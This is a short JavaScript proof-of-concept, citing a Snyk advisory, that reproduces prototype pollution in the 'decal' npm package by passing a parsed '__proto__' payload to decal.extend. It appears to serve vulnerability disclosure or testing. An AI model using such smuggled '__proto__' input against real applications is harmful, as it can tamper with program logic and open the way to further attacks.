//https://snyk.io/vuln/SNYK-JS-DECAL-1051028
 
  const decal = require("decal");

   

  const o = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  decal.extend({}, true, o);
// End of file
